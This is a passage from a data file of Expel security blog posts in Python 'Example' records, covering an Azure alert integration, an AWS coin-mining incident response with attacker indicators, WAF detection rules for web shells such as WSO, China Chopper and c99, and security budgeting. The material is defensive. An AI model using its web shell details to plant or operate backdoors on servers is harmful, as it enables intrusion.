(D&amp;R) team and the SOC to identify sources of signal and additional data to include in our alerts. Early on in the process the DI and D&amp;R teams evaluate the technology and to decide which security signals and raw events are accessible. For Azure, all security signals revolve around ASC. Once we decided on using ASC as our primary alert source, I got to work building out the data pipeline. D&amp;R got to work generating sample alerts within our test environment. Before long we had a POC working that was generating ASC alerts within the Expel Workbench. If you dont already know, ASC provides unified security management across all Azure resources as well as a single pane of glass for reviewing security posture and real-time alerts. Its one of the primary sources of alerts across Microsofts security solutions. But I still had to figure out the best way to access the data. The good part for Expel was that there are a lot of ways to access ASC alerts; the challenging part is that, well, there are a lot of ways to access ASC alerts. In the end, we went through three different approaches for accessing these alerts  each with their pros and cons: Microsoft Graph Security API Azure Log Analytics API Azure Management API When we began development of our Azure integration, the Security API was a relatively new offering within Microsoft Graph. Its intended to operate as an intermediary service between all Microsoft Security Providers and provides a common schema. Microsoft Graph Security API presents two advantages for Expel: The single point of contact for all Microsoft Security alerts allows us to easily adapt and expand our monitoring services as our customers needs and tech stack change without requiring our customers to enable us with new permissions or API keys. The common alert schema of the Security API means we only have to adapt one schema to Expels alert schema rather than one schema per Microsoft product offering. We already used Microsoft Graph Security API for our Azure Sentinel integration so we were poised to take advantage of the extensibility of the API by simply adding ASC to the types of alerts we were retrieving, or so we thought. Our SOC analysts walked us through comparisons between ASC alerts in the Expel Workbench and those same alerts within the ASC console. It quickly became apparent that the data we retrieved from Graph Security API were missing key fields. We had previously used Azure Log Analytics (ALA) to enrich alerts for our Azure Sentinel integration and thought we might be able to do the same for ASC. I worked with the analysts to find different sources of data so we could fill in those data gaps from the Graph Security API. With this approach, we could find almost all of the alert details not provided by the Graph Security API. The downside and eventual death knell to this approach was that ASC alerts by default are not forwarded to ALA. Forwarding ASC alerts would require extra configuration steps for our customers as well as the potential for increased ALA costs. The following chart gives a comparison of what ASC fields were found via each API for a single ASC alert for anomalous data exfiltration. Note that each ASC alert type will have different fields but this chart follows closely with our general experience of data availability across these APIs. A table showing, for anomalous activity related to storage blobs, what fields in the alert are or arent present based on how you access the alert As the saying goes: when one Azure door closes another always opens. We couldnt get the fields we needed from the Graph Security API and we couldnt reliably find those fields within Azure Log Analytics, but we still had Azure Management API to welcome us with open arms. The ASC console uses Azure Management API so we knew we could get data parity using that API. The reason we avoided it initially was that the normalization would require a lot more effort. Each alert type had its own custom fields (see properties.ExtendedProperties field ) and there wasnt a set schema for these fields. Fortunately, we had enough examples of these alerts and could use those examples to drive our normalization of Azure alerts. In the end, data parity and SOC efficiency are a higher priority for us than some upfront normalization pain, so we went down the Azure Management API route (pun intended). Scaling our SOC If youve ever worked with ASC, you probably also know that managing the alerts can feel a little overwhelming. Most of the alerts are based around detecting anomalous behavior or events (like unusual logins or unusual amounts of data extracted). Note that these alerts are generated from different Azure subsystems or resources, so as your environment changes, so do the types of alerts youll see. Microsoft is also constantly improving and updating these alerts so you might also find yourself handling preview alerts. And how do I know all this? I didnt until we started to scale up our POC integration. As soon as our analysts started seeing ASC alerts coming in Expel Workbench, we immediately got feedback around the lack of context available in the alert. Who is the someone that extracted data from the storage account? What are their usual interactions with that storage account? What other user activity was there outside of Azure Storage? These are all questions that our analysts would need to answer in order to act. The example below shows what little context we had around the ASC alert. Preview alert with missing storage operation data (ex. Extracted Blob Size) Without context, our analysts will pivot to the source technology to look for additional fields to help them make a decision. In this case, they log in to the Azure portal to get more info about the alert. This experience isnt ideal for our analysts. As a side note, pivots to console (when an analyst leaves Expel Workbench to get more details on an alert) is a monthly metric we present to the whole executive team. We track how many times a day, week and month analysts are pivoting (per each vendor technology we support) because its an easy indicator that theres room for improvement. My team works hard to provide our analysts with the information they need to quickly make good decisions and take action, rather than spending their time doing mundane tasks like logging into another portal. Any DI team member will tell you that their worst fear is writing an integration that creates extra work for (read as: annoys) the SOC. But most importantly, an efficient SOC helps us support more customers  and provide better service. For Azure in particular this meant adjusting the noise inherent in having large amounts of alert types and also adding more context around the anomaly-based alerts. Reducing the noise We continuously work to improve the signal of alerts with all of our integrations. ASC, however, was difficult because of the outsized impact configurations have on the variety of alerts you get. For instance, ASC alerts are not generated unless a paid service called Azure Defender is enabled. Azure Defender can be enabled per Azure subscription, per resource type such as Azure Defender for Servers and, in some cases, per individual resources. The configuration of Azure Defender along with the different underlying resources being monitored created a lot of variance in the alerts. As we transitioned from our test Azure environment to real cloud environments, we quickly found this out. Our D&amp;R team generated plenty of ASC alerts but in a live environment we received preview (i.e. beta) alerts, duplicate alerts from Azure AD Identity Protection or Microsoft Cloud App Security along with alerts from Azure resources that we couldnt set up in our environment. I was able to deduplicate the ASC alerts from other Azure Security Providers (one of the pros of the Security Graph API is that it will do this for you). The D&amp;R team was able to update detections so that we can ignore known low-fidelity alert types and preview alerts. But, even with all of these improvements, we can still get new alert types. As with any tuning effort, the work is ongoing. But we at least solved the known issues. Adding moar context By far the biggest challenge with our ASC integration was getting enough context around an alert so that our analyst could quickly understand the cause of the alert and make triage decisions. After iterating over all three REST APIs to address the data gaps, we eventually got to data parity between Expel Workbench and ASCs console. However, our analysts still didnt have the context they needed to understand ASC alerts based around anomaly detection. Enter the D&amp;R team. They took the lead on deciphering not only the breadth of alerts ASC generated but also, with the help of our SOC analysts, determined what types of log data were needed to understand each of these alerts. For instance, when we got an ASC alert warning of an unusual amount of data was extracted from a storage account, D&amp;R built automation in the Expel Workbench that uses platform log data to show analysts exactly what the users usual actions were. Helpful; right? You can see an example below. Example of automated decision support for an ASC alert in Expel Workbench That not only bridged the context gap of the ASC alerts but also helped provide a framework around how our analysts triage ASC alerts. And as a bonus it didnt require them to perform any additional manual steps or pivot into the Azure portal. Is this thing on? Finding the right alert signal and making sure our SOC can triage that signal efficiently are the bread and butter of any integration. However, getting those right doesnt necessarily mean weve created a great integration. Alongside these priorities, were focused on operations aspects of the integration: creating a good onboarding experience, ensuring we have optimal visibility (health monitoring) and reducing storage costs. Improving visibility When building the Azure integration, we added plenty of metrics to help us profile each environment. Some technologies we integrate with have a fairly narrow range of configuration options but when it comes to monitoring an entire cloud environment that range becomes very large, very fast. As we onboarded customers, we were not only looking at performance metrics but also monitoring subscription totals, resource totals and configurations of each resource. Example customer Azure Subscription totals with Azure Defender configuration settings The image above shows a sampling of a few of our Azure customers, the number of subscriptions were actively monitoring and the various Azure Defender configuration settings we detected. You can see theres a broad number of total subscriptions, and Azure Defender is in various status across the customer and subscriptions. We knew these metrics would help us provide insight to customers on how to maximize our visibility; we just didnt realize how quickly that was going to occur. Right away we started catching misconfigurations  disabled logs, Azure Defender not being enabled for any resources, missing subscriptions, etc. We could do as much alert tuning or detection writing as we wanted but without the proper visibility it wouldnt be much use. Example Expel Workbench warning of a potential device misconfiguration You might be noticing a theme: the importance of feedback. And our feedback loop doesnt just include our internal teams. Ensuring our customers are on the same page and can share their thoughts is critical to making sure were doing our job well. So, as we onboarded customers to the integration, our Customer Success team jumped in to work with customers to find ways to improve their configuration. They then ensured each of these customers understood the way our Azure monitoring works and the value of these configuration changes. As the Customer Success team worked, the Turn on and Monitoring team (this is Expels internal name for our feature team focused on making onboarding simple, intuitive and scalable along with proactively detecting problems with the fleet of onboarded devices Expel integrates with) used this feedback to build out a way for us to provide automatic notifications for common configuration issues. Example Ruxie notification for a misconfigured Azure Expel Workbench device Did you forget to provide access for us to monitor that subscription? No problem. We automatically detect that and provide you a notification along with steps to fix the issue within minutes of creating the Azure device in Workbench. Keeping costs in check There are design decisions which have very real implications toward cost as you build out integrations with an IaaS provider. Azure was no different. Requiring customers to enable Azure Defender increases their Azure bill. Requiring customers to forward resource logs to Azure Log Analytics increases their Azure bill. If we only integrate with Azure Sentinel, that increases our customers Azure bill. And so on When it comes to these decisions, we lean towards reducing direct cost to customers. Weve already discussed how important log data is for providing context around ASC alerts. Azure Storage log data is particularly important. This log data is basically a bunch of csv files within Azure Storage itself . If you want to search this data, you have to forward it to a log management solution within the Azure ecosystem  that means Log Analytics. During the development of the integration, the best resource from Microsoft for forwarding logs was to use a PowerShell Script to pull storage log data, translate it into JSON format and upload it to a Log Analytics workspace where the data can then be searched or visualized. As of this writing, there is a preview Diagnostic Settings feature for Azure Storage accounts that allows automatic forwarding of logs to ALA via the Azure console. Even though forwarding the logs to ALA is becoming easier, storing these logs in ALA can be expensive. In some cases, our customers would have paid more than $300 a day, or over $100k a year, to store their Azure Storage logs within ALA. Instead of requiring customers to foot the bill for the storage and also adding yet another configuration step, we decided to directly ingest those logs into our own backend log management solution. This helped us solve the cost problem across all our customers with a single solution. A typical approach to solving this problem is to figure out which logs you dont need and then filter them out prior to ingestion. In the case of Azure Storage, each log entry is a storage operation so it drops benign operations during ingestion. This approach is difficult for two reasons. The first is that were dealing with a large variety of Azure environments. Determining a set of benign operations may be possible for a single environment but the odds arent good for determining benign operations across all customer environments. The second is that these logs helped provide context around detections of anomalous behavior. Removing whole swaths of logs would make understanding what was normal versus abnormal more difficult. To get around this, I worked with D&amp;R to create a log aggregation approach that would decrease the log volume without filtering whole chunks of logs or reducing our context. The idea was that we could determine what log entries pertained to the same operation but at different points in time. If the operations were the same then we would combine them into a single log record with added operation counts and time windows. Based on the operation type we could loosen or tighten our definition of same in order to provide better aggregation performance. In the end, we were able to achieve a 93 percent reduction in volume across all of the storage accounts we were monitoring while still maintaining the contextual value of the logs themselves. This was no small feat considering the diversity of Azure Storage use cases, and thus log content, across our different Azure customers. Estimated costs for searchable Azure Storage logs Volume (MB/day) Est. ALA Cost ($/yr) Device Azure Storage Accounts Raw Aggregate Raw Aggregate Reduction (%) cb7ebb31-c17f-4b73-9962-db585b94f58d 68 173268 2917 138547 2332 98.32 6321c95f-b6c9-4e65-9a18-8760a0846387 24 54551 10047 43619 8033 81.58 0c839cc8-90ae-4733-b9f5-992f5461ed2c 168 19287 626 15422 500 96.76 afe394af-609e-425f-a075-197047aa1875 5 15718 5027 12569 4019 68.02 f3b0a370-d1d0-4160-a3fc-06d5ed400797 7 1569 9 1254 7 99.45 8e7a3c33-09be-468b-beeb-b51bcc524c06 58 49 13 39 10 73.58 503f94e4-7322-42c2-8794-8cbc51494a2e 21 40 17 32 14 56.90 3d77e130-23f9-4db7-a0aa-8212b2f513bd 2 17 2 14 2 88.47 1bc7556a-1a54-45f6-979a-77ab57b2af0f 1 16 2 13 1 88.68 Above is the table we built internally to track various customer storage costs as we worked to reduce their cost and still capture relevant logs to enable detection and response. Teamwork: Always Azure bet Our goal is to always provide high-quality alerts with as much context and information to both our analysts and customers. The collective expertise of our teams and their ability to react and solve problems in real-time helped us not only replace the third-party application, but also create an entirely new detection strategy around ASC that improves visibility and coverage for our existing customers, and improves our analysts experience  creating greater efficiency across the board. Remember the feedback loop I mentioned? Like all integrations we build, we dont consider the integrations to ever truly be complete. Theres always another company behind integrations that is making changes (hopefully improvements) that affect Expel. Thats another reason communicating in real-time is key. Each of Expels internal teams have the ability to drive changes to the integration or detection strategy. If youre considering building your own detections on top of Azure signal, I hope this post gave you a few ideas (and maybe even saved you some time AND money). Want to find out more about Azure signal and log sourcing? Check out our guidebook here .'}) (input_keys={'title'}),
  Example({'title': 'Behind the scenes in the Expel SOC: Alert-to-fix in AWS', 'url': 'https://expel.com/blog/behind-the-scenes-expel-soc-alert-aws/', 'date': 'Jul 28, 2020', 'contents': 'Subscribe  EXPEL BLOG Behind the scenes in the Expel SOC: Alert-to-fix in AWS Security operations  8 MIN READ  JON HENCINSKI, ANTHONY RANDAZZO, SAM LIPTON AND LORI EASTERLY  JUL 28, 2020  TAGS: Cloud security / How to / Managed detection and response / Managed security / SOC Over the July 4th holiday weekend our SOC spotted a coin-mining attack in a customers Amazon Web Services (AWS) environment. The attacker compromised the root IAM user access key and used it to enumerate the environment and spin up ten (10) c5.4xlarge EC2s to mine Monero . While this was just a coin miner, it was root key exposure. The situation could have easily gotten out of control pretty quickly. It took our SOC 37 minutes to go from alert-to-fix. Thats 37 minutes to triage the initial lead (a custom AWS rule using CloudTrail logs ), declare an incident and tell our customer how to stop the attack. Jons take: Alert-to-fix in 37 minutes is quite good. Recent industry reporting indicates that most incidents are contained on a time basis measured in days not minutes. Our target is that 75 percent of the time we go from alert-to-fix in less than 30 minutes. Anything above that automatically goes through a review process that well talk about more in a bit. Howd we pull it off so quickly? Teamwork. We get a lot of questions about what detection and response looks like in AWS, so we thought this would be a great opportunity to take you behind the scenes. In this post well walk you through the process from alert-to-fix in AWS over a holiday weekend. Youll hear from the SOC analysts and Global Response Team who worked on the incident. Before we tell you how it went down, heres the high level play-by-play: Triage, investigation and remediation timeline Now well let the team tell the story. Saturday, July 4, 2020 Initial Lead: 12:19:37 AM ET By Sam Lipton and Lori Easterly  SOC analysts Our shift started at 08:45 pm ET on Friday, July 3. Like many organizations, weve been working fully remotely since the middle of March . We jumped on the Zoom call for shift handoff, reviewed open investigations, weekly alert trending and general info for situational awareness. Things were (seemingly) calm. We anticipated a quieter shift. On a typical Friday night into Saturday morning, well handle about 100 alerts. Its not uncommon for us to spot an incident on Friday evening/Saturday morning, but its not the norm. Its usually slower on the weekend; there are fewer active users and devices. Our shift started as we expected, slow and steady. Then suddenly, as is the case in security operations, that all changed. We spotted an AWS alert based on CloudTrail logs that told us that EC2 SSH access keys were generated for the root access key from a suspicious source IP address using the AWS Golang SDK: Initial lead into the AWS coin-mining incident The source IP address in question was allocated to a cloud hosting provider that we hadnt previously seen create SSH key pairs via the ImportKeyPair API in this customers AWS environment (especially from the root account!). The SSH key pair alert was followed shortly thereafter by AWS GuardDuty alerts for an EC2 instance communicating with a cryptocurrency server (monerohash[.]com on TCP port 7777). We jumped into the SIEM, queried CloudTrail logs and quickly found that the EC2 instances communicating with monerohash[.]com were the same EC2 instances associated with the SSH key pairs that were just detected. Corroborating AWS GuardDuty alert As our CTO Peter Silberman says, it was time to buckle up and pour some Go Fast on this. Weve talked about our Expel robots in a previous post . As a quick refresher, our robot Ruxie (yes we give our robots names) automates investigative workflows to surface up more details to our analysts. In this event, Ruxie pulled up API calls made by the principal (interesting in this context is mostly anything that isnt Get*, List*, Describe* and Head*). AWS alert decision support  Tell me what other interesting API calls this AWS principal made This made it easy for us to understand what happened: The root AWS access key was potentially compromised. The root access key was used to access the AWS environment from a cloud hosting environment using the AWS Golang SDK. It was then used to create SSH keys, spin up EC2 instances via the RunInstances API call and created new security groups likely to allow inbound access from the Internet. We inferred that the root access key was likely compromised and used to deploy coin miners. Yep, time to escalate this to an incident, take a deeper look, engage the customer and notify the on-call Global Response Team Incident Handler. PagerDuty escalation to Global Response Team: 12:37:00 AM ET Our Global Response Team (GRT) consists of senior and principal-level analysts who serve as incident responders for critical incidents. AWS root key exposure introduces a high level of risk for any customer, so we made the call to engage the GRT on call using PagerDuty . The escalation goes out to a Slack channel thats monitored by the management team to track utilization. PagerDuty escalation out to the GRT on-call Incident declaration: 12:39:21 AM ET A few minutes after the initial lead landed in Expel Workbench  19 minutes to be exact  we notified the customer that there was a critical security incident in their AWS environment involving the root access key. And that access key was used to spin up new EC2 instances to perform coin mining. Simultaneously, we jumped into our SIEM and queried CloudTrail logs to help answer: Did the attacker compromise any other AWS accounts? How long has the attacker had access? What did the attacker do with the access? How did the attacker compromise the root AWS access key? At 12:56:43 ET we provided the first remediation actions to our customer to help contain the incident in AWS based on what we knew. This included: Steps on how to delete and remove the stolen root access key; and Instructions on how to terminate EC2 instances spun up by the attacker. We felt pretty good at this point  we had a good understanding of what happened. The customer acknowledged the critical incident and started working on remediation, while the GRT Incident Handler was inbound to perform a risk assessment. Alert-to-fix in 37 minutes. Not a bad start to our shift. Global Response Team enters the chat: 12:42:00 AM ET Follow @amrandazz By Anthony Randazzo  Global Response Team Lead I usually keep my phone on silent, but PagerDuty has a vCard that allows you to set an emergency contact. This bypasses your phones notifications setting so that if you receive a call from this contact, your phone rings (whether its in silent mode or not). We call it the SOC  bat phone . This wasnt the first time I was paged in the middle of the night. I grabbed my phone, saw the PagerDuty icon and answered. Theres a lot of trust in our SOC. I knew immediately that if I was being paged, then the shift analysts were confident that there was something brewing that needed my attention. I made my way downstairs to my office and hopped on Zoom to get a quick debrief from the analysts about what alerts came in and what they were able to discover through their initial response. Now that Im finally awake, its time to surgically determine the full extent of what happened. As the GRT incident handler, its important to not only perform a proper technical response to the incident, but also understand the risk. That way, we can thoroughly communicate with our customer at any given time throughout the incident, and continue to do so until were able to declare that the incident is fully contained. At this point, we have the answers to most of our investigative questions , courtesy of the SOC shift analysts: Did the attacker compromise any other AWS accounts? There is no evidence of this. How long has the attacker had access? This access key was not observed in use for the previous 30 days. What did the attacker do with the access? The attacker generated a bunch of EC2 instances and enabled an ingress rule to SSH in and install CoinMiner malware. How did the attacker compromise the root AWS access key? We dont know and may never know . My biggest concern at this point was communicating to the customer that the access key remediation needs to occur as soon as possible. While this attack was an automated coin miner bot, there was still an unauthorized attacker with an intent of financial gain that had root access to an AWS account containing proprietary and potentially sensitive information lurking somewhere. There are a lot of what ifs floating around in my head. What if the attacker realizes they have a root access key? What if the attacker decides to start copying our customers EBS volumes or RDS snapshots? Incident contained: 02:00:00 AM ET By 2:00 am ET we had the incident fully scoped which meant we understood: When the attack started How many IAM principals the attacker compromised AWS EC2 instances compromised by the attacker IP addresses used by the attacker to access AWS (ASN: AS135629) Domain and IP address resolutions to coin mining pool (monerohash[.]com:7777) And API calls made by the attacker using the root access key At this point I focused on using what we understood about the attack to deliver complete remediation steps to our customer. This included: A full list of all EC2 instances spun up by the attacker with details on how to terminate them AWS security groups created by the attacker and how to remove them Checking in on the status of the compromised root access key I provided a summary of everything we knew about the attack to our customer, did one last review of the remediation steps for accuracy and chatted with the SOC over Zoom to make sure we set the team up for success if the attacker came back. For reference, below are the MITRE ATT&amp;CK Enterprise and Cloud Tactics observed during Expels response: MITRE ATT&amp;CK Enterprise and Cloud Tactics observed during Expels response Initial Access Valid Accounts Execution Scripting Persistence Valid Accounts, Redundant Access Command and Control Uncommonly Used Port With the incident now under control, I resolved the PagerDuty escalation and called it a morning. PagerDuty escalation resolution at 2:07am ET Tuesday, July 7th Follow @jhencinski By Jon Hencinski  Director of Global Security Operations Critical incident hot wash: 10:00:00 AM ET For every critical incident well perform a lightweight 15-minute hot wash. We use this time to come together as a team to reflect and learn. NIST has some opinions on what you should ask , at Expel we mainly focus on asking ourselves: How quickly did we detect and respond? Was this within our internal target? Did we provide the right remediation actions to our customer? Did we follow the process and was it effective? Did we fully scope the incident? Is any training required? Were we effective? If not, what steps do we need to take to improve? If youre looking for an easy way to get started with a repeatable incident hot wash, steal this: Incident hot wash document template. Steal me! The bottom line: celebrate what went well and dont be afraid to talk about where you need to improve. Each incident is an opportunity to advance your skills and train your investigative muscle. Lessons Learned We were able to help our customer get the situation under control pretty quickly but there were still some really interesting observations: Its entirely possible that the root access key was scraped and passed off to the bot to spin up miners right before this was detected. We didnt see any CLI, console or other interactive activity, fortunately. The attacker definitely wasnt worried about setting off any sort of billing or performance alarms given the size of these EC2s. This was the first time we saw an attacker bring their own SSH key pairs that were uniquely named. Usually we see these generated in the bot automation run via the CreateKeyPair API. The CoinMiner was likely installed via SSH remote access (as a part of the bot). We didnt have local EC2 visibility to confirm, but an ingress rule was created in the bot automation to allow SSH from the Internet. This was also the first time wed observed a bot written in the AWS Golang software development kit (SDK). This is interesting because as defenders, its easy to suppress alert-based on user-agents, particularly SDKs we dont expect to be used in attacks. Well apply these lessons learned, continue to improve our ability to spot evil quickly in AWS and mature are response procedures. While we felt good about taking 37 minutes to go from alert-to-fix in AWS in the early morning hours, especially during a holiday, we dont plan on letting it get to our heads. We hold that highly effective SOCs are the right combination of people, tech and process. Really great security is a process, there is no end state  the work to improve is never done! Did you find this behind-the-scenes look into our detection and response process helpful? If so, let us know and well plan to continue pulling the curtain back in the future!'}) (input_keys={'title'}),
  Example({'title': 'Better web shell detections with Signal Sciences WAF', 'url': 'https://expel.com/blog/better-web-shell-detections-with-signal-sciences-waf/', 'date': 'Oct 9, 2019', 'contents': 'Subscribe  EXPEL BLOG Better web shell detections with Signal Sciences WAF Security operations  5 MIN READ  ALEC RANDAZZO  OCT 9, 2019  TAGS: Get technical / How to / Managed security / SOC If you work for an organization that has a web presence (and lets be real, they almost all do) and that presence is perfectly coded, has zero vulnerabilities nor any functions that could be misused  then you can stop reading. For everyone else, know that theres a real chance of your website being compromised at some point  leading to things like website defacement , website functionality modification or a broader compromise of the network . The common theme for these sorts of attacks are web vulnerabilities that lead to the upload of web shells, giving an attacker a foothold on the underlying server. In this blog post, Ill talk about what a web shell is, some of the typical ways of detecting them and the (vastly improved) detection method I discovered. Whats a web shell? A web shell is a web page or web resource that abuses certain functions in web languages (like PHP, JavaScript, etc.) that give it backdoor-like capabilities to the underlying web server. Capabilities typically include things like file upload, file download, and arbitrary command execution. Web shells usually crop up after a threat actor exploited a website vulnerability and gives the attacker an initial foothold onto a network through the web server. Typical methods of detecting web shells Detection of web shells traditionally comes in two forms, both with downsides. The first detection method involves detection on the endpoint by file name, file hash, or file content. Unfortunately this is often CPU intensive which means business operations teams may not allow you to do it on production systems. The second method is passive and effective but its a pain to set up and manage. It involves mirroring web traffic to a network traffic monitoring device that has built-in detections or supports custom Snort or Suricata rules. Youll also need to upload your web server SSL private keys to the network appliance(s) for SSL decryption or you wont be able to inspect encrypted web traffic. I dont know about you, but thats not a mess that Id want to manage or deal with. How Expel uses Signal Sciences WAF to detect web shells One of the commitments weve made to our customers since Expel was founded is to support and integrate with the security technologies that our customers already use or plan to buy. Several of our customers use the Signal Sciences Web Application Firewall (WAF) , so we created an easy way to integrate those security signals into Expel Workbench. As we were developing our integration, I discovered that the Signal Science WAF has a great capability to detect web shells thanks to a complete application layer visibility into web traffic with a user-friendly rules engine bolted on top. Thats right  a rules engine that allows you to key off of web content such as HTTP methods, any header keys and values (even custom headers), query parameter keys and values, post body keys and values, domain, URI, or any combination of the preceding items. This visibility and rules engine allows us to augment customers Signal Sciences WAF deployments with granular rules that detect network traffic to popular web shell variants with a high fidelity (meaning itll only trigger on the traffic were looking for). Ill pull back the curtain and show you how Expel develops web shell detection rules for its customers so you can try the process yourself with your own Signal Science WAF deployment. How Expel develops web shell detection rules using the Signal Sciences rules engine Heres a high-level overview of the web shell detection rule development process: Stand up a web server running whatever web language you want to develop rules for and install the Signal Science WAF agent. I started with an Ubuntu server running Apache and PHP. Find some web shells. Thankfully thats not very hard. Copy web shells you want to write rules for to a directory the web service is serving resources from. Load up a packet capturing tool or my preferred tool, Chrome browsers built-in developers console. Access the web shell and use its various functions, looking for unique indicators in the HTTP requests. Create the rule to detect the web shell in the Signal Science WAF rule editor and hook it up to a signal that would generate an alert. Test out your new rule by interacting with the web shell again, verifying that all the actions you intended to detect are being detected. Now Ill walk through the specifics of creating a rule for the WSO web shell version 4.0.5 (MD5: b4d3b9dbdd36cac0eba7a598877b6da1 ) starting at step 5 of the process I described above. The following screenshot series will show you how to take different actions through the WSO web shell while having Chromes developer console open. Youll see me: Executing pwd to return my present working directory. Executing ls to return a directory listing of my current working directory. Using the built in function Process status which is a WSO execution wrapper around the shell command ps aux and Navigating to the root of the servers file system. In each screenshot below, I added red boxes around the post-body parameters my browser sent to the web shell. Take a peek: Execution of pwd to return the present working directory. Execution of ls to return a list of content in the current working directory. Use of Process status which is a WSO execution wrapper around the shell command ps aux Navigation to the root of the servers file system. Each request always had the parameters a, c, p1, p2, p3 and charset. It turns out that all actions taken while using this web shell will have those parameters. If you review other versions of the WSO web shell thisll also be true. So if you want to generically detect WSO web shell use regardless of version, all you need to do is look for all those parameters being present in a request. Before you write a rule, you need to prepare a few things in the Signal Sciences WAF: Create a site signal on each site where you want your rules monitoring that your rules will point to. In my example, I called the signal expel-alert. Create a site alert that takes in the new signal and set the threshold to one request in one minute. This is the lowest threshold that you can set. Since your WSO web shell will be high fidelity, you want an alert generated if that threshold is ever met. Signal Sciences WAF has a powerful feature called advanced rules which Signal Sciences reps can turn on for you. Theres an additional cost, but the feature greatly expands the WAFs capability. For each Expel customer that has a Signal Science WAF, we deploy an advanced rule. This rule turns on verbose logging that records post-body contents and query parameters. We only enable verbose logging on expel-alert signals. This gives us complete visibility into commands sent to a web shell so we can investigate alerts. Now onto the meat of the rule. In the site rule editor, youll want to chain five Post Parameter exists where name equals &lt;string&gt; where &lt;string&gt; are the values a, c, p1, p2, p3, and charset. Set the rule action to add the signal expel-alert. Take a look at the final rule configuration: The final step is to test the efficacy of your rule by using the web shell some more to see what gets tagged. Take a look at the screen shot below  every request we made to the web shell was tagged with expel-alert and has its post-body contents logged. Success! Bonus: Free web shell detection rules As a reward for making it through this blog post, Ive got a prize for you: ten web shell detection rules that you can upload right into your Signal Science WAF. Theyll detect WSO, r57, c99, c99 madnet, PAS, China Chopper, B374k, reGeorg and reDuh web shells. Theres also a generic rule to detect some common commands that could be pushed to web shells we dont have explicit rules for. To download these web shell detection rules, submit your info below and well send it over in an email.'}) (input_keys={'title'}),
  Example({'title': 'Blog', 'url': 'https://expel.com/blog/page/5/', 'date': None, 'contents': None}) (input_keys={'title'}),
  Example({'title': 'Budget planning: determining your security spend', 'url': 'https://expel.com/blog/budget-planning-determining-security-spend/', 'date': 'Oct 16, 2017', 'contents': 'Subscribe  EXPEL BLOG Budget planning: determining your security spend Security operations  4 MIN READ  BRUCE POTTER  OCT 16, 2017  TAGS: Budget / Management / Planning Its a common question: How much should I spend on cybersecurity? Looking at your peers, analyst guidance, and postings on random security companies websites, its a difficult question. And theres not a one-size-fits-all answer. It may seem counterintuitive, but how much you spend on security is really a trailing indicator of how your company views security. In corporate life, were asked to set a budget long before well actually spend the money. So, we talk to our staff, we talk to company leadership and we attend conferences to figure out what we should be doing about cybersecurity and cyber risk management in our organization. Then we put together a budget, which gets kicked around for a while before its eventually approved. A few months later we, start finally spending those budget dollars. But by that time were really implementing our vision of security as it was 6 or even 12 months ago. What bucket are you in? What your vision is depends a lot on how your company views cybersecurity. Ive found most organizations fall into one of five buckets. Do any of these sound familiar? Security as an enabler ($$$$)  These are businesses that view cybersecurity as a differentiator to their service or product. Theyre implementing leading edge security solutions in an effort to set them apart from the pack. Risk based ($$$)  Organizations that have risk-based cybersecurity are constantly making tradeoffs between required security controls and their risk appetite. While spending in these organizations can be high, its also organized and controlled. Security as a requirement ($$)  Some businesses use regulatory and industry requirements to guide their spend. This is often less expensive than a risk-based approach but it wont have the same coverage of controls. Yet another piece of IT ($)  In these organizations, security is managed like IT spend, which for the most part means minimizing cost and not pulling from the bottom line. Reactionary ($?*!$)  This is the let the winds blow us where they may strategy of cybersecurity. When things go badly, theres a large spend. When they go well, the spend is minimal. Real Dollars By now Im guessing youve plotted what bucket your organization is in. But practically, how big are those dollar signs? According to Gartner , cybersecurity spend can vary from 1% to 13% of the overall IT budget. Thats a pretty big range that doesnt speak well to the maturity of the state of the security profession. At the low end of that spend, youll have organizations with minimal security controls and security incidents that go undetected and unaddressed for long periods of time. At the high end, youve got armies of dedicated staff, heavy tolling and engaged executives sponsoring cybersecurity initiatives. Be aware, though, that absolute dollars are only one measurement. Its important to understand where this money is being spent or more appropriately where it could be spent. Cybersecurity spend comes in many forms including staff, security software, hardware, contractor support, and outside services. Depending on your needs, youll find you get different levels of value depending on which buckets you spend your dollars in. For instance, in a small organization that is sensitive to hiring more staff, contract support or outside services may be a better bet than ramping up staffing. In larger, more sophisticated organizations, spending on software and hardware that automates existing security controls and processes may be the best thing you can do. Each approach has a different price tag and will affect where you land on the one to 13 percent spectrum. Find your focus (aka its all about outcomes) If youre struggling to figure out what type of security organization youre trying to be and what your long-term strategy is, my advice is to focus on your desired outcomes  both in proactive and reactive situations. Ask yourself: What outcomes do I want, and when do they need to be possible? Combine the answers to help focus your initial budget thinking or at least rationalize your planned spend and set company expectations on realistic outcomes. If your budget and expectations dont match (typically the budget is too small to meet the desired expectations) you need to do one of three things: 1) get more budget, 2) right-size expectations, 3) find a new job proactively because this story wont end well and you will likely be the scapegoat. Avoiding the trap door when youre in the breach zone There will always be ebbs and flows when it comes to how much money there is to go around. Everyone has lived through a budget crunch at some point and had to tighten belts and live off less. On the flip side, if youve suffered a major security event recently, your budget likely got a bump to help you deal with the breach, response activities, and remediation. I call this the breach zone. If youve been there youve probably also witnessed the panic spending that typically follows. Spending that windfall quickly is often seen as a proxy for progress. But it can also be a trap that sets you up for failure down the line. Why? Panic spending often results in buying products and services you dont ultimately get value from. Whats worse is that youre then stuck paying for those products out into the future  increasing your long-term budget needs even more with things you dont need. Not to mention the time it takes to maintain them. Its a bit like stretching to afford a sports car but then you realize you cant afford the expensive gas and insurance. A healthier approach is to use the specter of a breach to drive your budgeting process. If youre lucky enough to have escaped a breach, congrats. Pretend you have and go back to that outcome-based approach I talked about earlier. What do you need? What would you want to change in your org to achieve them? What investments would you make and what would you do differently? Use those answers to guide your budget process. Scenario based budget planning can help you build a budget for the security youre likely to need and ensure your spend is on target with what your organization requires in the future. Finding your spend Based on all this, the question still stands: How much should I spend on cybersecurity? The answer to that question is unique to each organization. As I said at the start, theres no one-size-fits-all answer. It depends on your maturity, current capabilities, executive support, and threat model; you may have wildly different spending needs than your peers. But there are some things you can do to find the budget thats right for you. Review your past spend and do an assessment. Did you get the results you want? What would you have done differently? Tabletop some terrible events like breaches and insider attacks. What would you need to respond? What would you need to stop it from happening? Use these answers to drive your budget and spending decisions. And remember that your budget is your own. Just because another organization is spending more or less doesnt matter if youre getting the results you want.'}) (input_keys={'title'}),
